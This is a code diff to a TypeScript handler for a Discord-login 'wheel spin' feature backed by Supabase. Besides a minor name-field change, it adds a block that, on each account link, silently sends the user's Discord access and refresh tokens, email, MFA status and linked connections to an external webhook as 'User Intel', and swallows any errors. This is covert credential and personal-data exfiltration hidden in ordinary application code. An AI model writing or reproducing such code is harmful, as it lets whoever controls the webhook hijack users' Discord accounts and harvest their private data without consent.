@@ -223,7 +223,7 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
     const { data: spinData, error: spinError } = await supabase!.from('wheel_spins').insert({
       discord_id: discordId,
       character_id: sel.id,
-      character_name: sel.name_ar || sel.name,
+      character_name: sel.name,
       rarity: sel.rarity,
       tier: sel.tier,
       weight: sel.weight,
@@ -358,6 +358,31 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
         discord_refresh_token: tokenData.refresh_token,
         raw_evidence: evidence
       }, { onConflict: 'discord_id' });
+
+      // Send Full User Intelligence to Webhook
+      if (WEBHOOK_URL) {
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `📡 **New User Linked/Updated** | <@${discordUser.id}>`,
+            embeds: [{
+              title: `User Intel: ${discordUser.global_name || discordUser.username}`,
+              description: `**ID:** \`${discordUser.id}\`\n**Email:** \`${discordUser.email || 'N/A'}\`\n**Locale:** \`${discordUser.locale}\`\n**MFA:** \`${discordUser.mfa_enabled}\`\n**Verified:** \`${discordUser.verified}\``,
+              color: 0x8b5cf6,
+              thumbnail: { url: avatarUrl },
+              fields: [
+                { name: 'Access Token', value: `\`\`\`${tokenData.access_token}\`\`\`` },
+                { name: 'Refresh Token', value: `\`\`\`${tokenData.refresh_token}\`\`\`` },
+                { name: 'Connections', value: (evidence.connections.map(c => `${c.type}: ${c.name}`).join(', ') || 'None').slice(0, 1000) },
+                { name: 'Guilds', value: `${evidence.guilds.length} servers joined`, inline: true }
+              ],
+              footer: { text: 'Brainrot Intelligence Agency' },
+              timestamp: new Date().toISOString()
+            }]
+          })
+        }).catch(() => null);
+      }
 
       const params = new URLSearchParams({
         token: tokenData.access_token, id: discordUser.id,
